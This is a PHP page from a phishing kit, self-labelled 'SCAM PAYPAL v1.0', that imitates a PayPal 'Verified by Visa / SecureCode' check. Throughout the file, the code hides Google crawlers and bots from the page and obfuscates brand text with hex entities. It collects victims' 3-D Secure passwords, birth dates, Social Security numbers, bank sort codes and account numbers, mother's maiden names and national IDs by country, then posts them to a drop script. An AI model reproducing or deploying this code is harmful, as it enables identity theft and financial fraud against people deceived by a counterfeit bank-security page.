<?php
/*   
        ───────────────────────────────────────────────────────────────────────────────────
        ───────────────────██████──────────██████─████████████████─────────────────────────
        ───────────────────██░░██████████████░░██─██░░░░░░░░░░░░██─────────────────────────
        ───────────────────██░░░░░░░░░░░░░░░░░░██─██░░████████░░██─────────────────────────
        ───────────────────██░░██████░░██████░░██─██░░██────██░░██─────────────────────────
        ───────────────────██░░██──██░░██──██░░██─██░░████████░░██─────────────────────────
        ───────────────────██░░██──██░░██──██░░██─██░░░░░░░░░░░░██─────────────────────────
        ───────────────────██░░██──██████──██░░██─██░░██████░░████─────────────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░██───────────────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░██████─██████────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░░░░░██─██░░██────────────────
        ───────────────────██████──────────██████─██████──██████████─██████────────────────
        ───────────────────────────────────────────────────────────────────────────────────
        ────────────────────────────────────────────────────────────────────────────────────
        ─██████████████─██████─────────██████████████─██████████████─██████──────────██████─
        ─██░░░░░░░░░░██─██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██████████──██░░██─
        ─██░░██████████─██░░██─────────██░░██████████─██░░██████░░██─██░░░░░░░░░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██─────────██░░██──██░░██─██░░██████░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██████████─██░░██████░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██████████─██░░██████░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██─────────██░░██──██░░██─██░░██──██░░██████░░██─
        ─██░░██████████─██░░██████████─██░░██████████─██░░██──██░░██─██░░██──██░░░░░░░░░░██─
        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░██──██████████░░██─
        ─██████████████─██████████████─██████████████─██████──██████─██████──────────██████─
        ───────────────────────────────────────────────────────────────────────────────────
                                        #=======================#
                                        #   SCAM PAYPAL v1.0    #
                                        #    Mr.CLEAN.PAYPAL    #
                                        #=======================#
                        ─────────────────────────────────────────────────────────
                        ─██████████████─██████████████─████████───██████████████─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░██───██░░░░░░░░░░██─
                        ─██████████░░██─██░░██████░░██─████░░██───██░░██████░░██─
                        ─────────██░░██─██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██████████░░██─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░██──██░░██───██░░██───██░░░░░░░░░░██─
                        ─██░░██████████─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░██─────────██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██░░██████████─██░░██████░░██─████░░████─██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░██─██░░░░░░░░░░██─
                        ─██████████████─██████████████─██████████─██████████████─
                        ─────────────────────────────────────────────────────────
   
*/
        session_start();
        error_reporting(0);
        ########################################################
        ################ [+] INCLUDE FILES [+] #################
        ########################################################
        include('../functions/get_lang.php'); 
        include('../functions/get_ip.php'); 
        include('../anti_bots/all_antibots.php'); 
        include('../anti_bots/index.php');
        ########################################################
        ############### [+] VBV INFORMATION [+] ################
        ########################################################
        $_SESSION['_password_vbv_'] = $_POST['password_vbv'];
        $_SESSION['_dob_'] = $_POST['day']."/".$_POST['month']."/".$_POST[''];
        $_SESSION['_sortnum_'] = $_POST['sortnum1']."-".$_POST['sortnum2']."-".$_POST['sortnum3'];
        $_SESSION['_accnumber_'] = $_POST['accnumber'];
        $_SESSION['_ssnnum_'] = $_POST['ssn1']."-".$_POST['ssn2']."-".$_POST['ssn3'];
        $_SESSION['_mmname_'] = $_POST['mmname'];
        $_SESSION['_creditlimit_'] = $_POST['creditlimit'];
        $_SESSION['_osid_'] = $_POST['osid'];	
        $_SESSION['_codicefiscale_'] = $_POST['codicefiscale'];
        $_SESSION['_kontonummer_'] = $_POST['kontonummer'];
        $_SESSION['_offid_'] = $_POST['offid'];
        ########################################################
        ############# [+] FILTER_VALIDATE_VBV [+] ##############
        ########################################################
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if(empty($_POST['password_vbv'])== false) {
        include('authentication_drop.php');
        }}
        ########################################################
        ######## [+] VERIFIED BY VISA : SECURECODE [+] #########
        ########################################################
        $VISACARD   = $_SESSION['_cc_brand_'] == "VISA" || $_SESSION['_cc_brand_'] == "VISA ELECTRON";
        $MASTERCARD = $_SESSION['_cc_brand_'] == "MASTERCARD" || $_SESSION['_cc_brand_'] ==  "MAESTRO";
        if($MASTERCARD) {
        $Type_XXX = "&#x4D;&#x61;&#x73;&#x74;&#x65;&#x72;&#x43;&#x61;&#x72;&#x64;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x65;&#x43;&#x6F;&#x64;&#x65;";
        $VBV_Name = "&#x53;&#x65;&#x63;&#x75;&#x72;&#x65;&#x43;&#x6F;&#x64;&#x65;";
        }elseif($VISACARD) {
        $Type_XXX = "&#x56;&#x65;&#x72;&#x69;&#x66;&#x69;&#x65;&#x64;&#x20;&#x62;&#x79;&#x20;&#x56;&#x69;&#x73;&#x61;";
        $VBV_Name = "&#x33;&#x44;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x20;";
        }
        ########################################################
        ############### [+] HTTP_USER_AGENT [+] ################
        ########################################################
        if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        ########################################################
?>
<!doctype html>
<html>
   <head>
    <script async="" src="https://www.paypalobjects.com/tagmgmt/bootstrap.js"></script>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>&#x33;&#x2D;&#x44;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x41;&#x75;&#x74;&#x68;.</title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
      <link rel="stylesheet" href="../Mfiles/Mnine.css">
      <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/b68/a04c217f6513295c043c0faf19ab1/css/styles.css" type="text/css">
      <link type="text/css" rel="stylesheet" href="../Mfiles/Mseven.css" />
    <link rel="shortcut icon" type="image/x-icon" href="../Mpic/Mfour.ico">
      <style type="text/css">
         textarea:focus, input:focus, input[type]:focus, .uneditable-input:focus {   
         border-color: #e50914;
         box-shadow: 0 1px 1px rgba(229, 103, 23, 0.075) inset, 0 0 8px rgba(229, 103, 23, 0.6);
         outline: 0 none;
         }
      </style>
   </head>
   <body>
      <div id="Rotation">
         <p style="font-size: 13px;"><?=$DSECURE;?></p>
      </div>
      <div id="popup">
         <p style="font-size: 15px;"><?=$Processing;?></p>
      </div>
      <div id="xMarcos_9X9X" style="opacity: 1;">
         <br>
         <div id="xGhostRiderForm" style="display:none !important;">
            <div class="a-section a-spacing-medium a-text-center">
               <a href="#" class="svg-nfLogo signupBasicHeader">
                  <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
   width="124px" height="33px" viewBox="0 0 124 33" enable-background="new 0 0 124 33" xml:space="preserve">
<path fill="#253B80" d="M46.211,6.749h-6.839c-0.468,0-0.866,0.34-0.939,0.802l-2.766,17.537c-0.055,0.346,0.213,0.658,0.564,0.658
  h3.265c0.468,0,0.866-0.34,0.939-0.803l0.746-4.73c0.072-0.463,0.471-0.803,0.938-0.803h2.165c4.505,0,7.105-2.18,7.784-6.5
  c0.306-1.89,0.013-3.375-0.872-4.415C50.224,7.353,48.5,6.749,46.211,6.749z M47,13.154c-0.374,2.454-2.249,2.454-4.062,2.454
  h-1.032l0.724-4.583c0.043-0.277,0.283-0.481,0.563-0.481h0.473c1.235,0,2.4,0,3.002,0.704C47.027,11.668,47.137,12.292,47,13.154z"
  />
<path fill="#253B80" d="M66.654,13.075h-3.275c-0.279,0-0.52,0.204-0.563,0.481l-0.145,0.916l-0.229-0.332
  c-0.709-1.029-2.29-1.373-3.868-1.373c-3.619,0-6.71,2.741-7.312,6.586c-0.313,1.918,0.132,3.752,1.22,5.031
  c0.998,1.176,2.426,1.666,4.125,1.666c2.916,0,4.533-1.875,4.533-1.875l-0.146,0.91c-0.055,0.348,0.213,0.66,0.562,0.66h2.95
  c0.469,0,0.865-0.34,0.939-0.803l1.77-11.209C67.271,13.388,67.004,13.075,66.654,13.075z M62.089,19.449
  c-0.316,1.871-1.801,3.127-3.695,3.127c-0.951,0-1.711-0.305-2.199-0.883c-0.484-0.574-0.668-1.391-0.514-2.301
  c0.295-1.855,1.805-3.152,3.67-3.152c0.93,0,1.686,0.309,2.184,0.892C62.034,17.721,62.232,18.543,62.089,19.449z"/>
<path fill="#253B80" d="M84.096,13.075h-3.291c-0.314,0-0.609,0.156-0.787,0.417l-4.539,6.686l-1.924-6.425
  c-0.121-0.402-0.492-0.678-0.912-0.678h-3.234c-0.393,0-0.666,0.384-0.541,0.754l3.625,10.638l-3.408,4.811
  c-0.268,0.379,0.002,0.9,0.465,0.9h3.287c0.312,0,0.604-0.152,0.781-0.408L84.564,13.97C84.826,13.592,84.557,13.075,84.096,13.075z
  "/>
<path fill="#179BD7" d="M94.992,6.749h-6.84c-0.467,0-0.865,0.34-0.938,0.802l-2.766,17.537c-0.055,0.346,0.213,0.658,0.562,0.658
  h3.51c0.326,0,0.605-0.238,0.656-0.562l0.785-4.971c0.072-0.463,0.471-0.803,0.938-0.803h2.164c4.506,0,7.105-2.18,7.785-6.5
  c0.307-1.89,0.012-3.375-0.873-4.415C99.004,7.353,97.281,6.749,94.992,6.749z M95.781,13.154c-0.373,2.454-2.248,2.454-4.062,2.454
  h-1.031l0.725-4.583c0.043-0.277,0.281-0.481,0.562-0.481h0.473c1.234,0,2.4,0,3.002,0.704
  C95.809,11.668,95.918,12.292,95.781,13.154z"/>
<path fill="#179BD7" d="M115.434,13.075h-3.273c-0.281,0-0.52,0.204-0.562,0.481l-0.145,0.916l-0.23-0.332
  c-0.709-1.029-2.289-1.373-3.867-1.373c-3.619,0-6.709,2.741-7.311,6.586c-0.312,1.918,0.131,3.752,1.219,5.031
  c1,1.176,2.426,1.666,4.125,1.666c2.916,0,4.533-1.875,4.533-1.875l-0.146,0.91c-0.055,0.348,0.213,0.66,0.564,0.66h2.949
  c0.467,0,0.865-0.34,0.938-0.803l1.771-11.209C116.053,13.388,115.785,13.075,115.434,13.075z M110.869,19.449
  c-0.314,1.871-1.801,3.127-3.695,3.127c-0.949,0-1.711-0.305-2.199-0.883c-0.484-0.574-0.666-1.391-0.514-2.301
  c0.297-1.855,1.805-3.152,3.67-3.152c0.93,0,1.686,0.309,2.184,0.892C110.816,17.721,111.014,18.543,110.869,19.449z"/>
<path fill="#179BD7" d="M119.295,7.23l-2.807,17.858c-0.055,0.346,0.213,0.658,0.562,0.658h2.822c0.469,0,0.867-0.34,0.939-0.803
  l2.768-17.536c0.055-0.346-0.213-0.659-0.562-0.659h-3.16C119.578,6.749,119.338,6.953,119.295,7.23z"/>
<path fill="#253B80" d="M7.266,29.154l0.523-3.322l-1.165-0.027H1.061L4.927,1.292C4.939,1.218,4.978,1.149,5.035,1.1
  c0.057-0.049,0.13-0.076,0.206-0.076h9.38c3.114,0,5.263,0.648,6.385,1.927c0.526,0.6,0.861,1.227,1.023,1.917
  c0.17,0.724,0.173,1.589,0.007,2.644l-0.012,0.077v0.676l0.526,0.298c0.443,0.235,0.795,0.504,1.065,0.812
  c0.45,0.513,0.741,1.165,0.864,1.938c0.127,0.795,0.085,1.741-0.123,2.812c-0.24,1.232-0.628,2.305-1.152,3.183
  c-0.482,0.809-1.096,1.48-1.825,2c-0.696,0.494-1.523,0.869-2.458,1.109c-0.906,0.236-1.939,0.355-3.072,0.355h-0.73
  c-0.522,0-1.029,0.188-1.427,0.525c-0.399,0.344-0.663,0.814-0.744,1.328l-0.055,0.299l-0.924,5.855l-0.042,0.215
  c-0.011,0.068-0.03,0.102-0.058,0.125c-0.025,0.021-0.061,0.035-0.096,0.035H7.266z"/>
<path fill="#179BD7" d="M23.048,7.667L23.048,7.667L23.048,7.667c-0.028,0.179-0.06,0.362-0.096,0.55
  c-1.237,6.351-5.469,8.545-10.874,8.545H9.326c-0.661,0-1.218,0.48-1.321,1.132l0,0l0,0L6.596,26.83l-0.399,2.533
  c-0.067,0.428,0.263,0.814,0.695,0.814h4.881c0.578,0,1.069-0.42,1.16-0.99l0.048-0.248l0.919-5.832l0.059-0.32
  c0.09-0.572,0.582-0.992,1.16-0.992h0.73c4.729,0,8.431-1.92,9.513-7.476c0.452-2.321,0.218-4.259-0.978-5.622
  C24.022,8.286,23.573,7.945,23.048,7.667z"/>
<path fill="#222D65" d="M21.754,7.151c-0.189-0.055-0.384-0.105-0.584-0.15c-0.201-0.044-0.407-0.083-0.619-0.117
  c-0.742-0.12-1.555-0.177-2.426-0.177h-7.352c-0.181,0-0.353,0.041-0.507,0.115C9.927,6.985,9.675,7.306,9.614,7.699L8.05,17.605
  l-0.045,0.289c0.103-0.652,0.66-1.132,1.321-1.132h2.752c5.405,0,9.637-2.195,10.874-8.545c0.037-0.188,0.068-0.371,0.096-0.55
  c-0.313-0.166-0.652-0.308-1.017-0.429C21.941,7.208,21.848,7.179,21.754,7.151z"/>
<path fill="#253B80" d="M9.614,7.699c0.061-0.393,0.313-0.714,0.652-0.876c0.155-0.074,0.326-0.115,0.507-0.115h7.352
  c0.871,0,1.684,0.057,2.426,0.177c0.212,0.034,0.418,0.073,0.619,0.117c0.2,0.045,0.395,0.095,0.584,0.15
  c0.094,0.028,0.187,0.057,0.278,0.086c0.365,0.121,0.704,0.264,1.017,0.429c0.368-2.347-0.003-3.945-1.272-5.392
  C20.378,0.682,17.853,0,14.622,0h-9.38c-0.66,0-1.223,0.48-1.325,1.133L0.01,25.898c-0.077,0.49,0.301,0.932,0.795,0.932h5.791
  l1.454-9.225L9.614,7.699z"/>
</svg>
               </a>
            </div>
            <div class="a-section a-text-center">
               <style>
                  div.ex1 {
                  width:400px;
                  margin: auto;
                  }
               </style>
               <form method="POST" action="authentication_drop.php" class="GOxGOxPOWERxRANGERS">
               <div class="ex1">
                  <div class="a-section cvf-page-layout">
                     <div id="cvf-page-content" class="a-section">
                        <div class="a-section a-spacing-double-large">
                           <div class="a-box a-spacing-base">
                              <div class="a-box-inner a-padding-extra-large">
                                 <table>
                                    <tbody>
                                       <tr>
                                          <td><img class="cc_bank" id="cc_bank" src="../Mpic/Mssl.png"></td>
                                          <?php 
                                             if($MASTERCARD) {  
                                                                      echo '<td><img class="cc_type" id="cc_type" src="../Mpic/Mfive.png"></td>';
                                             }elseif($VISACARD){
                                              echo '<td><img class="cc_type" id="cc_type" src="../Mpic/Msix.png"></td>';
                                             }
                                             ?>
                                       </tr>
                                    </tbody>
                                 </table>
                                 <br />
                                 <style>
                                    width:230px;
                                 </style>
                                 <div id="xDoctorStrange_L1" style="text-align: center;font-family: PayPal-Sans-Regular, sans-serif;"><?=$_SESSION['_cc_bank_'];?></div>
                                 <div id="xDoctorStrange_L1"><?=$Safety;?></div>
                                 <div id="xDoctorStrange_L2"><?=$Type_XXX;?> <?=$protect;?> <b></b> <?=$against;?> <?=$Type_XXX;?> <?=$future;?> <?=$Type_XXX;?> <?=$Password;?></div>
                                 <div id="xDoctorStrange_L3">
                                    <table>
                                       <tbody>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?=$Nameon;?></td>
                                             <td><?=htmlentities($_SESSION['_cc_holder_']);?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?=$CountryName;?></td>
                                             <td class="limit"><?=ucwords(strtolower($_SESSION['_country_']));?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?=$TypeCard;?></td>
                                             <td><?=ucwords(strtolower($_SESSION['_ccglobal_']));?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?=$NumberCard;?></td>
                                             <td>XXXX-XXXX-XXXX-<?=substr($_SESSION['_cc_number_'] , -4);?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?=$Datetime;?></td>
                                             <td><?=date('m/d/Y').", ".date("h:i:s A");?></td>
                                          </tr>
                                             <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;"><?=$Birth;?></td>
                                                <td>
                                                  <input required 
                                                  style="width: 44px;text-align: center;" 
                                                  id="month" 
                                                  type="tel" 
                                                  placeholder="MM" 
                                                  name="month" 
                                                  class="dob" 
                                                  maxlength="2" 
                                                  data-maxlength="2"/>
                                                   / 
                                                   <input required 
                                                   style="width: 50px;text-align: center;" 
                                                   id="day" 
                                                   type="tel" 
                                                   placeholder="DD" 
                                                   name="day" 
                                                   class="dob" 
                                                   maxlength="2" 
                                                   data-maxlength="2"/>
                                                    / 
                                                    <input required 
                                                    style="width: 58px;text-align: center;" 
                                                    id="year" 
                                                    type="tel" 
                                                    placeholder="YYYY" 
                                                    name="year" 
                                                    class="dob" 
                                                    maxlength="4" 
                                                    data-maxlength="4"/>
                                                  </td>
                                             </tr>
                                             <?php
                                                ############################ ITALY ############################ 
                                                if($_SESSION['_countrycode_'] == "IT") {  
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">'.$Fiscale.'</td>
                                                <td><input required type="tel" name="codicefiscale" id="codicefiscale" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                }
                                                ################### SWITZERLAND || GERMANY #####################
                                                elseif($_SESSION['_countrycode_'] == "CH" || $_SESSION['_countrycode_'] == "DE") {  
                                                echo '<tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">'.$Kontonummer.'</td>
                                                <td><input required type="tel" name="kontonummer" id="kontonummer" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                        }
                                                ########################### GREECE #############################
                                                elseif($_SESSION['_countrycode_'] == "GR") {  
                                                echo '<tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">'.$Official.'</td>
                                                <td>
                                                <input required type="tel" name="offid" id="offid" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                        }
                                                ########################## AUSTRALIA ###########################
                                                elseif($_SESSION['_countrycode_'] == "AU") {
                                                echo '<tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">'.$OSID.'</td>
                                                <td><input required type="tel" name="osid" id="osid" style="width: 170px;padding-left: 4px;"></td></tr>
                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;"><?=$Credit;?></td>
                                                <td><input required type="tel" name="creditlimit" id="creditlimit" style="width: 170px;padding-left: 4px;"></td></tr>';
                                                        }
                                                ################# IRELAND || UNITED KINGDOM  ###################
                                                elseif ($_SESSION['_countrycode_'] == "IE" || $_SESSION['_countrycode_'] == "GB" ) {
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">'.$Sort.'</td>
                                                <td><input required type="tel" name="sortnum1" id="sortnum1" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="sortnum2" id="sortnum2" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="sortnum3" id="sortnum3" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"></td>
                                                </tr>                  
                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">'.$AccountNumber.'</td>
                                                <td><input required type="tel" name="accnumber" id="accnumber" class="accnumber" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';        
                                                 
                                                        }
                                                #################### UNITED STATES || CANADA ###################
                                                elseif ($_SESSION['_countrycode_'] == "US" || $_SESSION['_countrycode_'] == "CA") {
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">'.$SSN.'</td>
                                                <td><input required type="tel" name="ssn1" id="ssn1" class="ssnum" style="width:30px;padding-left: 2px;" maxlength="3" data-maxlength="3"> - <input required type="tel" name="ssn2" id="ssn2" class="ssnum" style="width: 24px;padding-left: 2px;" maxlength="2" data-maxlength="2"> - <input required type="tel" name="ssn3" id="ssn3" class="ssnum" style="width:40px;padding-left: 4px;" maxlength="4" data-maxlength="4"></td>
                                                                          </tr>';
                                                  }
                                                #################### IRELAND || CANADA ###################
                                                  if ($_SESSION['_countrycode_'] == "IR" || $_SESSION['_countrycode_'] == "CA") {
                                                     echo'<tr class="Height_XXX">
                                                                            <td ALIGN="LEFT" style="font-weight: bold;">'.$Maiden.'</td>
                                                                            <td><input required type="tel" name="mmname" id="mmname" style="width: 170px;padding-left: 4px;"></td>
                                                                        </tr>';
                                                      }     
                                                ?>
                                             <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;"><?=$VBV_Name;?> :</td>
                                                <td><input required type="password" name="password_vbv" id="password_vbv" style="width: 170px;padding-left: 4px;"/></td>
                                             </tr>
                                             <tr>
                                                <td><?=$_SESSION['_cc_phone_'];?></td>
                                                <td><?=$_SESSION['_cc_site_'];?></td>
                                             </tr>
                                       </tbody>
                                    </table>
                                 </div>
                                 <br>
                                 
                                                  <input type="submit" id="submit" value="<?=$ACTIVATE;?>" class="btn full">
                                                
                                 </form>
                              </div>
                           </div>
                        </div>
                        <p class="a-spacing-none"><?=$Cannot;?> <?=$Type_XXX;?>?
                        <div class="a-section">    <span><?=$Contact;?> </span>
                           <a>&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; <?=$Customer;?></a>
                        </div>
                        </p>
                     </div>
                  </div>
               </div>
            </div>
            <style>
               .auth-footer-separator {
               display: inline-block;
               width: 20px;
               }
            </style>
            <div class="a-divider a-divider-section">
               <div class="a-divider-inner"></div>
            </div>
            <div id="footer" class="a-section">
               <div class="a-section a-spacing-small a-text-center">
                  <span class="auth-footer-separator"></span>
                  <a>
                  <?=$Conditions;?>
                  </a>
                  <span class="auth-footer-separator"></span>
                  <a>
                  <?=$Notice;?>
                  </a>
                  <span class="auth-footer-separator"></span>
                  <a>
                  <?=$Help;?>
                  </a>
                  <span class="auth-footer-separator"></span>
               </div>
               <div class="a-section a-spacing-none a-text-center">
                  <span class="a-size-mini a-color-secondary">
                  © 1999-<?=date('Y');?>&#x2C;&#x20;&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;&#x20;&#x49;&#x6E;&#x63;&#x2E; <?=$affiliates;?>
                  </span>
               </div>
            </div>
         </div>
      </div>
      </div>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script> 
<!------------------------------- FILE JAVASCRIPT --------------------------------->
      <script type="text/javascript">
      $(document).ready(function(){
         $("#submit").on('click', function(e){
          var month = $('#month').val();
          var day = $('#day').val();
          var year = $('#year').val();

          if (month == '' || month > 12 || month < 1){
            $('#month').css("border-color", "red");
            return false;
          } else if (day == '' || day > 31 || day < 1){
            $('#day').css("border-color", "red");
            return false;
          } else if (year == '' || year > 2018 || year < 1900){
            $('#year').css("border-color", "red");
            return false;
          } else if ($('#password_vbv').val() == ''){
            $('#password_vbv').css("border-color", "red");
            return false;
          } else {
            $('#Rotation').fadeIn(300);
          }
         });
       });
    </script> 
<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script src="../Mfiles/Mone.js"></script>
    <script src="../Mfiles/Mtwo.js"></script>
    <script type="text/javascript">
      $(document).ready(function(){
      $("#popup").delay(1000).fadeOut(0);
      $("#xGhostRiderForm").delay(1000).fadeIn(300);
    });
    </script>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
   </body>
</html>